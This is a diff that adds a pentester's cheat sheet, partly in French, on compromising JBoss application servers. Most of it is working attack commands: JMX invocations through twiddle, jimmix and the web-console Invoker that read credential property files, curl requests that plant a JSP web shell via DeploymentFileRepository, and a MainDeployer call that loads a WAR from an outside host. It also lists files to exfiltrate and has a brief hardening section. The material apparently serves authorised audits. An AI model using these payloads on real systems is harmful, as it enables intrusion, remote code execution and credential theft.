@@ -1,0 +1,119 @@
+# jboss
+
+# quick links
+http://synacktiv.com/ressources/Intrusion_JBoss_AS_MISC.pdf
+http://www.hsc-news.com/archives/2013/000102.html
+http://lab.mediaservice.net/notes_more.php?id=JBOSS_more
+http://www.hsc.fr/ressources/presentations/sstic10_jboss/sstic10_jboss_article.pdf
+http://www.redteam-pentesting.de/publications/jboss
+http://www.openwall.com/lists/oss-security/2014/03/31/1
+
+# bon resume des CVE
+http://seclists.org/oss-sec/2014/q1/702
+
+# info gath
+jboss.system:type=ServerConfig
+
+# jboss seam framework RCE CVE-2010-1871 (jboss admin console based on this framework, authentication form is vuln, Jboss 5.1 to 6.1.0 Final concerned) 
+http://cvedetails.com/cve/2010-1871/
+https://bugzilla.redhat.com/show_bug.cgi?id=615956
+http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html
+
+# RMI calls w/ twiddle
+./bin/twiddle.sh -o localhost get "jboss.system:type=ServerInfo"
+./jimmix.sh -i http://jboss/invoker/JMXInvokerServlet get "jboss.system:type=ServerInfo" OSVersion
+
+# jboss6 and jmxinvokerservlet
+./bin/twiddle.sh -o localhost invoke "jboss.web:type=Manager,host=localhost" listSessionIds # No MBean matches for query: jboss.web:type=Manager,host=localhost
+./bin/twiddle.sh -o localhost invoke "jboss:name=SystemProperties,type=Service" showAll # no security manager: RMI class loader disabled 
+./bin/twiddle.sh -o localhost invoke "jboss.admin:service=DeploymentFileRepository" store xxxyyy.war xxxyyy .jsp ThisIsATest True # from blog but "No MBean matches for query: jboss.admin:service=DeploymentFileRepository"
+./bin/twiddle.sh -o localhost invoke "jboss.system:service=MainDeployer" deploy http://127.0.0.1/appli.war
+
+# BSH if outbound conns denied
+./bin/twiddle.sh -o localhost invoke "jboss.deployer:service=BSHDeployer" createScriptDeployment "`cat redteam.bash`" redteam.bsh # to test
+./bin/twiddle.sh -o localhost invoke "jboss.system:service=MainDeployer" deploy file:/tmp/redteam.war
+
+# read jboss/server/default/conf/props/jmx-console-users.properties
+* jimmix
+./jimmix.sh -P 127.0.0.1:8082 -i http://x.x.x.x/invoker/JMXInvokerServlet invoke jboss:name=SystemProperties,type=Service load file:///d:/apps/jboss-4.2.3.GA/server/default/conf/props/jmx-console-users.properties
+./jimmix.sh -P 127.0.0.1:8082 -i http://x.x.x.x/invoker/JMXInvokerServlet invoke jboss:name=SystemProperties,type=Service showAll (stacktrace but see response in proxy)
+* redteam tools
+use burp or socat to redirect to https
+./webconsole_invoker.rb -u http://127.0.0.1:8008/web-console/Invoker -i load -s "java.lang.String" -p file:///opt/jboss/jboss-4.2.3.GA/server/default/conf/props/jmx-console-users.properties jboss:name=SystemProperties,type=Service
+./webconsole_invoker.rb -u http://127.0.0.1:8008/web-console/Invoker -i showAll jboss:name=SystemProperties,type=Service
+
+# lister les jsessionid
+mbeanServer.invoke(new ObjectName("jboss.web:type=Manager,host=localhost"), "listSessionIds", null, null) // see hsc-news
+
+# scanner des jmx-console
+http://FILE0:8080/jmx-console/style_master.css
+
+## info gathering
+clusterd
+msf auxiliary/scanner/http/jboss_vulnscan
+nmap http-vuln-cve2010-0738.nse
+/web-console/ServerInfo.jsp
+
+/status
+/jmx-console/HtmlAdaptor
+/web-console/Invoker
+/invoker/JMXInvokerServlet
+
+verb tampering
+
+## webshell
+* MainDeployer
+http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system%253Aservice%253DMainDeployer&methodIndex=17&arg0=http%3A%2F%2F6.6.6.6%2Fpub%2FWSTest.war
+
+* DeploymentFileRepository MBean
+curl -v http://127.0.0.1:8080/jmx-console/HtmlAdaptor -d 'action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=wstestdepl.war&argType=java.lang.String&arg1=wstestdepl&argType=java.lang.String&arg2=.jsp&argType=java.lang.String' --data-urlencode arg3@code/NetBeansProjects/WSTest.war.jsp -d 'argType=boolean&arg4=True'
+curl -v http://127.0.0.1:8080/wstestdepl/wstestdepl.jsp
+curl -v http://127.0.0.1:8080/wstest/
+
+# webshell le plus simple possible mais on verra pas le resultat des commandes (exemple du paper 2010 redteam)
+curl -X HEAD -v 'http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=shell.war&argType=java.lang.String&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3C%25Runtime.getRuntime%28%29.exec%28request.getParameter%28%22c%22%29%29%3B%25%3E%0A&argType=boolean&arg4=True'
+curl -v 'http://127.0.0.1:8080/shell/shell.jsp?c=touch%20%2ftmp%2fowned.txt'
+
+cleanup:
+/wstest/ETest -d 'c=rmdir+f:\jboss-4.2.3.GA\server\default\deploy\management\wstestdepl.war+/S+/Q'
+/wstest/ETest -d 'c=rmdir+f:\jboss-4.2.3.GA\server\default\work\jboss.web\localhost\wstestdepl+/S+/Q'
+/wstest/ETest -d 'c=rmdir+f:\jboss-4.2.3.GA\server\default\work\jboss.web\localhost\wstest+/S+/Q'
+/wstest/ETest -d 'c=del+f:\jboss-4.2.3.GA\server\default\deploy\management\wstest.war'
+
+# deployer webshell via JMXInvokerServlet a la mano
+http://breenmachine.blogspot.com.au/2013/09/jboss-jmxinvokerservlet-exploit.html
+http://breenmachine.blogspot.com.au/2014/02/jboss-jbxinvoker-servlet-update.html
+
+# securiser jmx & web consoles
+https://community.jboss.org/wiki/SecureTheJmxConsole
+https://community.jboss.org/wiki/SecureJBoss 
+worm: https://community.jboss.org/blogs/mjc/2011/10/20/statement-regarding-security-threat-to-jboss-application-server
+sec-script-0.1.zip
+
+# audit
+liste des fichiers à récupérer d'après CVS/guides/Jboss/audit_jboss.txt
+
+# JMX Console
+/opt/jboss/server/default/deploy/jmx-console.war/WEB-INF/web.xml
+/opt/jboss/server/default/conf/props/jmx-console-users.properties
+
+# Web Console
+/opt/jboss/server/default/deploy/management/console-mgr.sar/web-console.war/WEB-INF/web.xml 
+/opt/jboss/server/default/conf/login-config.xml 
+
+/opt/jboss/server/default/conf/props/jmx-console-users.properties 
+/opt/jboss/server/default/conf/props/jmx-console-roles.properties 
+
+/opt/jboss/server/default/conf/props/web-console-users.properties
+/opt/jboss/server/default/conf/props/web-console-roles.properties
+
+/opt/jboss/server/default/conf/jboss-service.xml
+
+# recuperer tous les fichiers login-config.xml
+/opt/jboss/server/default/conf/login-config.xml
+
+# tout recuperer
+find -type f ! \( -name '*.jar' -o -name '*.war' \) -print0 -o -type d -print0 | xargs -0 tar cf /path/to/jboss.tar
+
+# JBoss6 & JMXInvokerServlet
+http://docs.jboss.org/jbosssecurity/docs/6.0/security_guide/html/chap-Consoles_and_Invokers.html
